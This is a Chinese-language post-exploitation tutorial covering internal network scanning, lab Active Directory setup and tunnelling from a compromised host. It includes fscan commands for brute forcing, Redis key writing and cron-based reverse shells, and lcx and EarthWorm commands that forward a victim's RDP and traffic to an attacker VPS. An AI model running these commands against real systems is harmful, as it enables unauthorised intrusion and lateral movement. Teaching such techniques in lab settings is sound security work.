严格来说，NetBIOS 不是一种协议，而是一种**应用程序接口**(Application Program Interface, API)。

几乎所有局域网都是在 NetBIOS 协议的基础上工作的，操作系统可以利用WINS服务.广播.Lmhost 文件等模式将 NetBIOS 名解析为相应的 IP 地址。

NetBIOS 的工作流程就是正常的机器名解析.查询.应答的过程。在 Windows中，默认安装TCP/IP后会自动安装NetBIOS。

在实际利用时，向局域网的每个IP地址发送 NetBIOS 状态查询，可以获得主机名,MAC地址等信息。

NBTScan 是一款用于扫描 Windows 网络上 NetBIOS 名称的程序，用于发现内网中存活的 Windows 主机。

NBTScan 可以对给定 IP 范围内的每个 IP 地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，

对于每个响应的主机，会列出它的 IP 地址,NetBIOS 计算机名,登录用户名的 MAC 地址。

项目下载地址：[http://www.unixwiz.net/tools/nbtscan.html](http://www.unixwiz.net/tools/nbtscan.html)

将 NBTScan.exe 上传到目标主机，执行以命令：

```bash
NBTScan.exe 192.168.10.0/24
```

### 3.3 基于ARP发现存活主机

ARP (Address Resolution Protocol，地址解析协议)是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议，用于网络层通信。

主机发送信息时，将包含目标IP地址的ARP请求广播到局域网上的所有主机，并接收返回消息，以此确定目标的物理地址:收到返回消息后，将该IP地址和物理地址存入本机ARP缓存，并保留一定时间，下次请求时直接查询ARP缓存，以节约资源。

在实际利用中，可以向网络发送一个ARP请求，若目标主机处于活跃状态，则其一定会回应一个ARP响应，否则不会做出任何回应。

ARP-Scan 是一款快速,便携的内网扫描工具.利用 ARP 发现内网中存活的主机。

将工具上传到目标主机，执行下列命令，即可扫描内网中存活的主机。

下载地址：[https://pan.baidu.com/s/1dH7CbvY3Eyy5hJw_PEsGWg](https://pan.baidu.com/s/1dH7CbvY3Eyy5hJw_PEsGWg)	 提取码：z30b 

```bash
arp-scan.exe -t 192.168.10.0/24
```

### 3.4 FSCAN 工具扫描

FSCAN介绍：一款内网综合扫描工具，方便一键自动化,全方位漏扫扫描。 

支持主机存活探测,端口扫描,常见服务的爆破,ms17010，redis批量写公钥,计划任务反弹shell,读取win网卡信息,web指纹识别，web漏洞扫描,netbios探测，域控识别等功能。  

项目地址：[https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)

```bash
Fsan的用法非常多。
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 .不保存文件.跳过web poc扫描)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)
fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
fscan.exe -hf ip.txt (以文件导入)
fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
```

### 3.5 ScanLine 端口扫描

ScanLine是一款windows下的端口扫描的命令行程序。

它可以完成PING扫描，TCP端口扫描，UDP端口扫描等功能。

运行速度很快，不需要winPcap库支持，应用场合受限较少。

下载地址：[https://pan.baidu.com/s/13UJ5XcY7U9pC2GsCstgX6A](https://pan.baidu.com/s/13UJ5XcY7U9pC2GsCstgX6A) 	提取码：ht3e 

```bash
scanline.exe -bhpt 21-23,25,80,110,135,139,143,443,445,1433,1521,3306 IP
scanline.exe -bhpt 80,443 1.1..1-254(IP)
scanline.exe -bhpt 139,445 IP
```

### 3.6 利用MSF探测内网

| 模块类型         | 模块路径                              | 说明                     |
| ---------------- | ------------------------------------- | ------------------------ |
| 主机探测模块     | auxiliary/scanner/netbios/nbname      | 基于NetBIOS探测存活主机  |
|                  | auxiliary/scanner/discovery/udp_probe | 基于UDP探测存活主机      |
|                  | auxiliary/scanner/discovery/udp_sweep | 基于UDP探测存活主机      |
|                  | auxiliary/scanner/discovery/arp_sweep | 基于ARP探测存活主机      |
|                  | auxiliary/scanner/snmp/snmp_enum      | 基于SNMP探测存活主机     |
|                  | auxiliary/scanner/smb/smb_version     | 基于SMB探测存活主机      |
| 内网端口扫描模块 | auxiliary/scanner/portscan/ack        | 基于TCP ACK进行端口扫描  |
|                  | auxiliary/scanner/portscan/tcp        | 基于TCP ACK进行端口扫描  |
|                  | auxiliary/scanner/portscan/syn        | 基于SYN进行端口扫描      |
|                  | auxiliary/scanner/portscan/xmas       | 基于TCP XMas进行端口扫描 |



```bash
msfconsole
use auxiliary/scanner/discovery/arp_sweep
show options
set rhost 192.168.70.1/24
run
```

# 内网环境搭建

## 环境介绍

该实验将会创建一个域环境，

需要配置一台 Windows Server 2012 R2 服务器，将其升级为**域控制器**，

然后将Windows Server 2008 R2 计算机和 Windows 7 计算机加入该域。

### 三台机器的 IP 地址设置

| 计算机                 | ip            | 密码      |
| ---------------------- | ------------- | --------- |
| Windows Server 2012 R2 | 192.168.70.33 | Admin@123 |
| Windows Server 2008 R2 | 192.168.70.32 | qwe.123   |
| Windows 7              | 192.168.70.34 | Admin@123 |

## 1.Windows Server 2012 R2 服务器设置

### （1）设置服务器

在虚拟机中安装 Windows Server 2012 R2 操作系统，

> 设置其 IP 地址为  192.168.70.33 
>
> 子网掩码为 255.255.255.0
>
> DNS指向本机 IP 地址。

![image-20241016143242190](https://image.201068.xyz/assets/38.后渗透/image-20241016143242190.png)

### （2）更改计算机名

使用本地管理员账户登录，将计算机名改为 "`DC`" （可以随意取名），更改后需要重启服务器。

![](https://image.201068.xyz/assets/38.后渗透/1661421352023.png)

> DC

### （3）安装域控制器和 DNS 服务

接下来在 Windows Server 2012 R2 服务器上安装**域控制器**和 **DNS 服务**。

登录 Windows Server 2012 R2 服务器，打开 "**服务器管理器**" 窗口

![](https://image.201068.xyz/assets/38.后渗透/1661421582821.png)

单击 "**添加角色和功能**" 选项，进入 "添加角色和功能向导" 界面。

在 "开始之前" 的部分均保持默认设置。

单击 "**下一步**" 按钮，进入"安装类型" 部分，选择 "**基于角色或者基于功能的安装**" 选项。

单击 "下一步" 按钮，进入 "**服务器选择**" 部分。

目前，在服务器池中只有当前这台机器，保持默认设置。

单击 "下一步" 按钮，在 "服务器角色" 部分勾选 "**Active Directory 域服务器**" 和 "**DNS服务器**" 复选框。

![](https://image.201068.xyz/assets/38.后渗透/1661422147219.png)

在**功能界面保持默认设置**，单击 "下一步" 按钮，进入 "确定" 部分。

确认需要安装的组件，勾选 "**如果需要，自动重新启动目标服务器**" 复选框，然后单击 "安装" 按钮。

![](https://image.201068.xyz/assets/38.后渗透/1661434770253.png)

### （4）升级服务器

安装 Active Directory 域服务器后，需要**将此服务器提升为域控制器**。

单击  "**将此服务器提升为域控制器**" 选项（如果不小心点击了 "关闭按钮" ，可以打开 "服务器管理器" 界面进行操作），在界面右上角可以看到一个中间有感叹号的三角形按钮，单击此按钮即可看到 "将此服务器提升为域控制器" 选项。

![](https://image.201068.xyz/assets/38.后渗透/1661435268526.png)

点击该按钮后会进入 "**Active Directory 域服务配置向导**" 界面，

在 "**部署配置**" 部分单击选择 "**添加新林**" 按钮，

然后输入根域名 "`wasj.test`"  后点击下一步。

> wasj.test

![](https://image.201068.xyz/assets/38.后渗透/1661435426533.png)

在 "**域控制器选项**" 部分，将林功能级别,域功能级别都设置为 "`Windows Server 2012 R2`"。

创建域林时，在默认情况下应选择 **DNS 服务器**，

林中的第一个域控制器必须是**全局目录服务器**且**不能是只读域控制器（**RODC）。

然后，设置目录服务器**还原模式的密码**（在开机进入安全模式修复活动目录数据库时将使用此密码）

> Admin@123

![](https://image.201068.xyz/assets/38.后渗透/1661436014376.png)

在 "**DNS选项**" 部分会出现关于DNS的警告。

不用理会该警告，**保持默认设置**。

单击 "下一步" 按钮，进入 "**其他选项**" 部分。

在 "**NetBIOS域名**" （不支持DNS域名的旧版本操作系统，例如 `Windows 98.NT`，需要通过 NetBIOS 域名进行通信）部分保持默认设置。

![image-20241016144425566](https://image.201068.xyz/assets/38.后渗透/image-20241016144425566.png)

单击 "下一步" 按钮，进入 "**路径**" 部分，指定**数据库,日志,SYSVOL文件夹的位置**，其他选项保持默认设置。

![image-20241016144440423](https://image.201068.xyz/assets/38.后渗透/image-20241016144440423.png)

单击 "下一步" 按钮，保持默认设置。单击 "下一步" 按钮，最后单击 "**安装**" 按钮。

![image-20241016144603807](https://image.201068.xyz/assets/38.后渗透/image-20241016144603807.png)

安装后，需要重启服务器。

**服务器重新启动**后，需要使用**域管理员账户**（`WASJ\Administrator`）登录。

> WASJ\Administrator

此时，在 "**服务器管理器**" 界面中就可以看到 AD DS ,DNS 服务了。

![](https://image.201068.xyz/assets/38.后渗透/1661476378333.png)

### （5）创建 Active Directory 用户

为`Windows Server 2008 R2` 和 `Windows 7` 用户创建**域控制器账户**。

在 "Active Directory用户和计算机" 界面选择 "`Users`" 目录并单击右键，使用弹出的快捷菜单**添加用户**。

![](https://image.201068.xyz/assets/38.后渗透/1661476803859.png)

#### 创建Win7账户

![](https://image.201068.xyz/assets/38.后渗透/image-20220916131518614.png)

![image-20241016145812856](https://image.201068.xyz/assets/38.后渗透/image-20241016145812856.png)

> wasj\win7 / Admin@123

#### 创建Win2008账户

![image-20241016150040414](https://image.201068.xyz/assets/38.后渗透/image-20241016150040414.png)

![image-20241016150113578](https://image.201068.xyz/assets/38.后渗透/image-20241016150113578.png)

> wasj\win2008 / Admin@123

## 2.Windows 7 计算机设置

将 Windows 7 计算机添加到 `wasj.test` 域中。

设置 IP 地址为 `192.168.70.34`，

设置 DNS 地址为 `192.168.70.33` 

![image-20241016160250606](https://image.201068.xyz/assets/38.后渗透/image-20241016160250606.png)

然后运行 "`ping wasj.test`" 进行测试。

```bash
ping wasj.test
```

![image-20241016160157301](https://image.201068.xyz/assets/38.后渗透/image-20241016160157301.png)

接下来，将主机添加到域中，将计算机改名为 "`Win7-X64`"，将域名改为 "`wasj.test`" 。

单击 "**确定**" 按钮，会弹出要求输入拥有权限的域账户和密码的对话框，在此处**输入域管理员的账户和密码**。

操作完成后会出现需要**重启计算机**的提示。

> Win7-X64
>
> wasj.test

![](https://image.201068.xyz/assets/38.后渗透/image-20220916132918611.png)

> administrator / Admin@123

![image-20241016151327319](https://image.201068.xyz/assets/38.后渗透/image-20241016151327319.png)

计算机重新启动后，使用刚刚在 Windows Server 2012 R2 **创建的 Win7 用户登录域**

![](https://image.201068.xyz/assets/38.后渗透/image-20220916133346830.png)

> wasj\win7 / Admin@123

## 3.Windows Server 2008 R2 计算机设置

将 Windows 2008 R2 计算机添加到 `wasj.test` 域中。

设置 IP 地址为 `192.168.70.32`，

设置 DNS 地址为 `192.168.70.33` 

![image-20241016155956742](https://image.201068.xyz/assets/38.后渗透/image-20241016155956742.png)

然后运行 "`ping wasj.test`" 进行测试。

```bash
ping wasj.test
```

![image-20241016160602969](https://image.201068.xyz/assets/38.后渗透/image-20241016160602969.png)

接下来，将主机添加到域中，将计算机改名为 "`Win2008-X64`"，将域名改为 "`wasj.test`" 。

单击 "确定" 按钮，会弹出要求输入拥有权限的域账户和密码的对话框，在此处输入域管理员的账户和密码。

操作完成后会出现需要重启计算机的提示。

> Win2008-X64
>
> wasj.test

![](https://image.201068.xyz/assets/38.后渗透/image-20220916133932334.png)

> win2008 / Admin@123
>
> administrator / Admin@123

![image-20241016152120489](https://image.201068.xyz/assets/38.后渗透/image-20241016152120489.png)

# 域环境基础知识

## 1 内网工作环境

### 1.1  工作组

工作组（Work Group）是计算机网络的一个概念，也是最常见和最普通的资源管理模式，就是将不同的计算机按照功能或部门分别置于不同的组。

试想，一个组织可能有成百上千台计算机，如果这些计算机不进行分组，就会显得十分混乱。

通过创建不同的工作组，不同的计算机可以按照功能或部门归属到不同的组内，整个组织的网络就会变得具有层次性。

这样，只需在计算机的“网上邻居”中找到相应的工作组，就可以发现所包含的所有计算机，从而访问相应的资源。

要加入或创建工作组很简单。

只需右击桌面上的“计算机”（或“此电脑”）图标，在弹出的快捷菜单中选择“属性”，在弹出的对话框中单击“更改设置”，

然后在弹出的“系统属性”对话框中单击“更改”，在“计算机名”栏中输入自定义的主机名称，

并在“工作组”栏中输入需要加入的工作组名称，

单击“确定”按钮并重新启动计算机即可。

注意，如果指定的工作组不存在，就会创建一个新的工作组。

在默认情况下，局域网内的计算机都是采用工作组方式进行资源管理的，即处在名 `WORKGROUP`的工作组中。

### 1.2  域

通过工作组对局域网的计算机进行分类，可以使资源的管理和访问更加层次化。但是工作组只适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况。

当组织中的网络规模越来越庞大时，需要统一的管理和集中的身份验证，并且能够为用户提供更加方便的网络资源搜索和使用方式时，就需要放弃工作组而使用域。

域（Domain）是一种比工作组更高级的计算机资源管理模式，既可以用于计算机数量较少的小规模网络环境，也可以用于计算机数量众多的大型网络环境。

在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册。

当域用户需要想访问域中的资源时，必须通过域控制器集中进行身份验证。

而通过身份验证的域用户对域中的资源拥有什么样的访问权限取决于域用户在域中的身份。

在域环境中，域管理员用户是域中最强大的用户，在整个域中具有最高访问权限和最高管理权限，可以通过域控制器集中管理组织中成千上万台计算机网络资源，所以在实际渗透过程中，能获得域管理员相关权限往往可以控制整个域控。

### 1.3 单域

单域是指网络环境中只有一个域。在一个计算机数量较少、地理位置固定的小规模的组织中，建立一个单独的域，足以满足需求。

![](https://typora---img.oss-cn-beijing.aliyuncs.com/img/image-20221118021222335.png)

### 1.4 父域和子域

在有些情况下，为了满足某些管理需求，需要在一个域中划分出多个域。被划分的域称为父域，划分出来的各部分域称为子域。

例如，一个大型组织的各部门位于不同的地理位置，这种情况下就可以把不同位置的部门分别放在不同的子域，

然后部门通过自 已的域来管理相应的资源，并且每个子域都能拥有自己的安全策略。

从域名看，子域是整个域名中的一个段。各子域之间使用.来分割，一个就代表域名的一个层级。

下图中 hack-my.com是父域，其余两个是其子域。

![](https://typora---img.oss-cn-beijing.aliyuncs.com/img/image-20221118021440581.png)

![](https://typora---img.oss-cn-beijing.aliyuncs.com/img/image-20221118021448521.png)

### 1.5 域树

域树是多个域通过建立信任关系组成的一个域集合。

在域树中，所有的域共享同一表结构和配置，所有的域名形成一个连续的名字空间，

如下图所示，可以看出，域树中域的命名空间具有连续性，并且域名层次越深，级别越低

![](https://image.201068.xyz/assets/38.后渗透/image-20221118021713913.png)



在域树中，域管理员只能管理本域，不能访问或者管理其他域。

如果两个域之间需要互相访问，就需要建立信任关系(Trust Relation)。

### 1.6 域林

域林是指由一个或多个没有形成连续名字空间的域树组成域树集合，如图下图所示。

域林与域树最明显的区别就是，域林中的域或域树之间没有形成连续的名字空间， 而域树是由一些具有连续名字空间的域组成。

![](https://image.201068.xyz/assets/38.后渗透/image-20221118022348029.png)

### 1.7 域控制器

域控制器(Domain Controller, DC)是域环境核心的服务器计算机，用于在域中响应安全身份认证请求，负责允许或拒绝发出请求的主机访问域内资源，以及对用户进行身份验证、存储用户账户信息并执行域的安全策略等。

可以说，域控制器是整个域环境的中控枢纽。域控制器包含一个活动目录数据库，其中存储着整个域的账户、密码、 计算机等信息。

在技术领域，域控制器有时被简称为域控。

一个域环境可以拥有一台或多台域控制器，每台域控制器各自存储一份所在域的活动目录的可写副本，对活动目录的任何修改都可以从源域控制器同步复制到域、域树或 域林的其他控制器上。

即使其中一台域控制器瘫痪，另一台域控制器可以继续工作，以保证域环境的正常运行。

### 1.8 活动目录

活动目录(Active Directory, AD)是指安装在域控制器上，为整个域环境提供集中式目录管理服务的组件。

活动目录存储了有关域环境中各种对象的信息，如域、用户、 用户组、计算机、组织单位、共享资源、安全策略等。

目录数据存储在域控制器的 Ntds.dit 文件中，文件路径为域控制器的 `%SystemRoot%\ntds\ntds.dit` ，文件中包括但不限于有关域用户、用户密码的哈希散列值、用户组、组成员身份和组策略的信息。活动目录主要提供了以下功能。

+ 计算机集中管理：集中管理所有加入域的服务器及客户端计算机，统一下发组策略。
+ 用户集中管理：集中管理域用户、组织通讯录、用户组，对用户进行统一的身份 认证、资源授权等。
+ 资源集中管理：集中管理域中的打印机、文件共享服务等网络资源。
+ 环境集中配置：集中的配置域中计算机的工作环境，如统一计算机桌面、统一网 络连接配置，统一计算机安全配置等。
+ 应用集中管理：对域中的计算机统一推送软件、安全补丁、防病毒系统，安装网络打印机等。

### 1.9 域用户、机器用户、用户组介绍

#### 1.9.1 域用户

域用户，顾名思义，就是域环境中的用户，在域控制器中被创建，并且其所有信息都保存在活动目录中。

域用户账户位于域的全局组 Domain Users 中，而计算机本地用户账户位于本地 User s组中。

当计算机加入域时，全局 Domain Users 会被添加到计算机本地的 Users 组中。

因此，域用户可以在域中的任何一台计算机上登录。执行以下命令可以查看域中的所有域用户。

```bash
net user /domain
```

#### 1.9.2 机器用户

机器用户其实是一种特殊的域用户。

在域环境中，计算机上的本地用户 SYSTEM 对应域中的机器账户，在域中的用户名就是 机器名`+$`。

执行以下命令可以查看域中所有的机器用户。

当获取一台域中主机的控制权后，发现没有域中用户凭据，此时可以利用一些系统 提权方法，将当前用户提升到 SYSTEM 以机器账户权限进行域内的操作。

```bash
net group "Domain Computers" /domain
```

#### 1.9.3 域本地组

多域用户访问单域资源（访问同一个域）

可以从任何域添加用户账户、通用组和全局组，但只能在其所在域内指派权限。

域本地组不能嵌套于其他组中。

它主要是用于授予位于本域资源的访问权限。

#### 1.9.5 全局组

单域用户访问多域资源（必须是一个域里面的用户）

只能在创建该全局组的域中添加用户和全局组。可以在域森林的任何域内指派权限。

全局组可以嵌套在其他组中。

可以将某个全局组添加到同一个域的另一个全局组中，或者添加到其他域的通用组和域本地组中。

#### 1.9.4 **通用组**

多域用户访问多域资源

通用组的成员可包括域树或域林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用。

**简单一句话概括：**

+ 域本地组：来自全林，作用于本域
+ 全局组：来自本域，作用于全林
+ 通用组：来自全林，作用于全林

| wasj.com     | shanghai.wasj.com          | beijing.wasj.com         |
| ------------ | -------------------------- | ------------------------ |
| test  本地组 | 能从所有域中添加用户       | 但是只能在本域中指派权限 |
| test2 全局组 | 只能添加wasj.com当中的用户 | 但是能在所有域中指派权限 |
| test3 通用组 | 能从所有域中添加用户       | 能在所有域中指派权限     |

#### **内置组**

在安装域控制器时，系统会自动生成一些组，称为内置组。

内置组定义了一些常用的权限。

通过将用户添加到内置组中可以使用户获得相应的权限。

活动目录控制台窗口的 Builtin 和 Users 组织单元中的组就是内置组。

+ 内置的域本地组在 Builtin 组织单元中。
+ 内置的全局组和通用组在 Users 组织单元中。

![](https://image.201068.xyz/assets/38.后渗透/1728834064496-e7005f4b-b99f-48ae-a722-7d03adcd9e39.png)

![](https://image.201068.xyz/assets/38.后渗透/c61f9faedb8e08158d10374714e514ff.jpeg)

#### **几个比较重要的域本地组**

+ **管理员组(Administrators)**：该组的成员可以不受限制地存取计算机/域内的资源。

  它不仅是最具权利的一个组，也是在活动目录和域控制器中默认具有管理员权限的组。

  该组的成员可以更改 Enterprise Admins、Schema Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。

+ **远程登录组(Remote Desktop Users)**：该组的成员具有远程登录权限。

+ **打印机操作员组(Print Operators)**：该组的成员可以管理网络打印机，包括建立，管理及删除网络打印机，并可以在本地登录和关闭域控制器。

+ **账号操作员组(Account Operators)**：该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。

  但是，不能更改属于Administrators或Domain Admins组的账号，也不能更改这些组。

  在默认情况下，该组中没有成员。

+ **服务器操作员组(Server Operators)**：该组的成员可以管理域服务器，其权限包括建立、管理、删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。

  在默认情况下，该组中没有成员。

+ **备份操作员组(Backup Operators)**：该组的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。

  在默认情况下，该组中没有成员。

#### **几个比较重要的全局组、通用组的权限**

+ **域管理员组(Domain Admins)**：该组的成员在所有加入域的服务器、域控制器和活动目录中均默认拥有完整的管理员权限。

  因为该组会被添加到自己所在域的Administrators组中，因为可以继承Administrators组的所有权限。

  同时，该组默认会被添加到每台域成员计算机的本地Administrators组中。

  这样，Domain Admins组就获得了域中所有计算机的所有权。

  如果希望某用户成为域系统管理员，建议将该用户添加到Domain Admins组中，而不要直接将该用户添加到Administrators组中。

+ **企业系统管理员组(Enterprise Admins)**：该组是域森林根域中的一个组。

  该组在域森林中的每个域内都是Administrators组的成员，因此对所有域控制器都有完全访问权。

+ **域用户组(Domain Users)**：该组是所有的域成员，在默认情况下，任何由我们建立的用户账号都属于Domain Users组，而任何由我们建立的计算机账号都属于Domain Computers组。

  因此，如果想让所有的账号都获得某种资源存取权限，可以将该权限指定给域用户组，或者让域用户组属于具有该权限的组。

  域用户组默认是内置域Users组的成员。

+ **架构管理员组(Schema Admins)**：该组是域森林根域中的一个组，可以修改活动目录和域森林的模式。

  该组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。



# 端口转发与内网代理

在渗透测试中，在获取目标外网权限后，需要通过转发端口或搭建代理等方式建立内网通道。

本节课将简要介绍这些转发和代理技术的相关基础，以及搭建相应测试环境，通过演示常规工具的使用让各位同学更好理解。

## 一.端口转发和代理

### 1.1.正向连接和反向连接

在开始介绍端口转发与内网代理前，先补充两个基本概念：正向连接和反向连接。

例如，Metasploit 大致可以分为两种 Meterpreter，

一种是以 `windows/meterpreter/bind_tcp`为代表的Bind Shell，

另一种是以 `windows/meterpreter/reverse_tcp` 为代表的 Reverse Shell。

其中，Bind Shell 用于正向连接，而Reverse Shell 用于反向连接。

#### 1.1.1.正向连接

正向连接就是受控端主机监听一个端口，由控制端主机主动去连接受控端主机的过程，适用于受控主机具有公网IP的情况下。

例如在下图中，Attacker 和 Victim 主机**都具有公网IP**，Attacker 可以直接通过IP地址访问到 Victim，所以能够使用正向连接来控制 Victim。

![](https://image.201068.xyz/assets/38.后渗透/图 3-1-1.png)

#### 1.1.2.反向连接

反向连接是控制端主机监听一个端口，由受控端主机反向去连接控制端主机的过程，适用于**受控端主机没有公网IP**的情况。

例如，如下图所示，Victim 是一台位于内网，并且没有公网IP的主机，Attacker无法直接通过IP地址访问到 Victim。

所以此时需要在Atacker 上监听一个端口，让Victim去反向连接 Attacker，从而实现对 Victim的控制。

在渗透测试中，正向连接往往受限于受控主机上的防火墙屏蔽及权限不足等情况，而反向连接可以很好地突破这些限制。

![](https://image.201068.xyz/assets/38.后渗透/3-1-2.png)

### 1.2.端口转发

**端口转发**（Port Forwarding）是**网络地址转换**（NAT）的一种应用。

通过端口转发，**一个网络端口上收到的数据可以被转发给另一个网络端口**。

转发的端口可以是**本机的端口**，也可以是**其他主机上的端口**。

在现实环境中，内网部署的各种防火墙和入侵检测设备会检查敏感端口上的连接情况，如果发现连接存在异样，就会立即阻断通信。

通过端口转发，设置将这个被检测的敏感端口的数据转发到防火墙允许的端口上，建立起一个通信隧道，可以绕过防火墙的检测，并与指定端口进行通信。

**端口映射**（Port Mapping）也是**网络地址转换**（NAT）的一种应用，用于把公网的地址翻译成私有地址。

端口映射可以**将外网主机收到的请求映射到内网主机上**，使得没有公网 IP 地址的内网主机能够对外提供相应的服务。

注意，根据相关资料，端口转发与端口映射的概念并没有严格的术语解释，有的资料只是定义了这两个术语，并作为同一个术语进行解释，所以我们此处也不做区分。

### 1.3.SOCKS代理

SOCKS 全称为 `Protocol For Sessions Traversal Across Firewall Securely`，是一种代理协议，其标准端口为`1080`。

SOCKS 代理有 SOCKS 4 和 SOCKS 5 两个版本，SOCKS 4  只支持TCP，而 SOCKS 5 在 SOCKS 4 的基础上进一步扩展，可以支持 UDP 和各种身份验证机制等协议。

采用 SOCKS 协议的代理服务器被称为 SOCKS 服务器，这是一种通用的代理服务器，在网络通信中扮演着一个请求代理人的角色。

在内网渗透中，通过搭建 SOCKS 代理，可以与目标内网主机进行通信，避免多次使用端口转发。

## 二.常见转发和代理工具

### 2.1.LCX端口转发

lcx是一个基于 Soket 套接字实现的端口转发工具，有 Windows 和 Linux 两个版本。

一个正常的 Socket 隧道必须具备两端：

一个为服务端，监听一个端口，等待客户端的连接；

另一端为客户端，通过传入服务端的 IP 地址和端口，才能主动与服务器连接。

#### 2.1.1.目标机有公网 IP

测试环境如下图所示，右侧的Windows Server 2012 是一个具有公网 IP 地址的 Web 服务器。左侧的 Kali 为攻击机。

![](https://image.201068.xyz/assets/38.后渗透/3-2-1.png)

假设此时已经获取了 Windows Server 2012 的控制权，需要登录其远程桌面查看情况，但是防火墙对 3389 端口做了限制，不允许外网机器对 3389 端口进行连接。

那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口。

在  **Windows Server 2012** 上执行以下命令，然后通过连接 Windows Server 2012 的 4444 端口，即可成功访问其远程桌面。

```bash
lcx.exe -tran 4444 127.0.0.1:3389
```

> - `lcx.exe` 是local port forwarding工具的执行程序。
> - `-tran` 参数表示启动端口转发。
> - `4444` 是本地端口,用于监听连接。
> - `127.0.0.1:3389` 是远程主机地址和端口。
>

所以这个命令的作用是:

1. 在本地监听 4444 端口。
2. 当有连接到本地4444端口时,lcx会自动建立与127.0.0.1地址的3389端口的连接。
3. 随后转发本地4444端口和远程3389端口之间的数据流。

这样就实现了本地端口4444到远程端口3389的转发。

本地程序连接4444,就相当于连接了远程3389端口

#### 2.1.2.端口映射

测试环境如下图所示。

右侧的Web 服务器（Windows Server 2012）有两个网卡分别连通**外网**和**内网**，

分别为公网 IP(模拟）地址 `192.168.223.248` 和内网 IP地址 `192.168.52.10`。

内网还存在一台 MySQL 服务器。

假设已经获取 **Windows Server 2012 的控制权**，经过信息收集，获得**内网中 MySQL服务器**的登录凭据，接下来需要登录这台服务器。

但是服务器位于内网，无法直接通过 IP 地址进行访问，所以需要通过端口映射，将 MySQL 服务器的 `3389` 端口映射到Windows Server 2012。

可通过下方命令探测内网存活主机

```bash
for /L %i in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%i | findstr "TTL="
```

![](https://image.201068.xyz/assets/38.后渗透/图 3-2-4.png)

在 Windows Server 2012 上执行以下命令，

将 MySQL 服务器的 3389 端口映射到 Windows Server 2012 的 2222 端口，

然后通过连接 Windows Server 2012 的 2222 端口，即可成功访问内网 MySQL 服务器的 3389。

```bash
lcx.exe -tran 2222 192.168.52.21:3389
```

#### 2.1.3.目标机无公网 IP

测试环境如下图所示，右侧的 Web 服务器 （Windows Server 2012）没有公网 IP 地址，通过 NAT 对外提供 Web 服务，左侧的 CentOS 7.6 为测试人员的公网 VPS。

![](https://image.201068.xyz/assets/38.后渗透/图 3-2-7.png)

假设已经获取 Windows Server 2012 的控制权，需要登录其远程桌面查看情况，但是 Windows Server 2012 没有公网IP地址，无法直通过IP地址进行访问，所以需要公网VPS监听一个端口，将 Windows Server 2012的3389 端口转发到 VPS的这个端口上。

首先，在VPS上执行如下命令，监听本地的7777端口，并将8888端口上接收到的数据转发给本机的7777端口

```bash
./lcx -listen 7777 8888
```

然后在 Windows Server 2012 上执行以下命令，控制 Windows Server 2012 去连接 VPS 的 8888 端口，

然后连接 VPS 的 7777 端口可访问 Windows Server 2012 的远程桌面。

```bash
lcx.exe -slave 47.93.xxx.xxx:8888 127.0.0.1:3389
```

### 2.3.EW结合proxychains代理链

EW(EarthWorm)

`EW` 是一套便携式的网络穿透工具，具有 SOCKS5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。

该工具能够以“正向”,“反向”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。

工具包中提供了多种可执行文件，以适用不同的操作系统，`Linux,Windows,MacOS,Arm-Linux` 均被包括其内，跨平台，任何平台都可以轻松使用！

现在有这么一个环境，我们**获取到了位于公网Web服务器的权限，内网中存在另外一台主机**。

然后，我们现在要将公网Web服务器设置为代理，访问和探测内网主机的信息。

#### 2.3.1.EW正向代理

**Web服务器的设置**

监听本地的1080端口

**我们攻击主机的设置**

如果是Linux系统，配置proxychains代理链的配置文件，将代理设置成 WEB服务器 的1080端口：

```bash
socks5 WEB服务器IP 1080 
```

然后命令前面加上 proxychains即可。

```bash
proxychains curl 192.168.10.19 
```

如果是Windows系统，直接浏览器中设置代理为 WEB 服务器IP的 1080 端口，

或者利用  `Proxifier ,sockscap64` 设置**全局代理**

#### 2.3.2.EW反向代理

**Web服务器的设置**

```bash
ew_for_Win.exe -s rssocks -d VPSIP -e 8888  #将本机的流量全部转发到攻击机的8888端口
```

**攻击主机的设置**

```bash
ew_for_Win.exe -s rcsocks -l 1080 -e 8888   #将本机的8888端口的流量都转发给1080端口
```

然后浏览器中设置代理为 127.0.0.1 的1080端口，或者利用  `Proxifier` ,`sockscap64` 设置全局代理

### 2.4.Netsh实现端口转发

**Netsh** 是Windows自带的命令行脚本工具，它可以建立端口映射。

现在有这么一个环境，内网中有一台Web服务器，但是我们处于公网，所以无法访问该服务器。

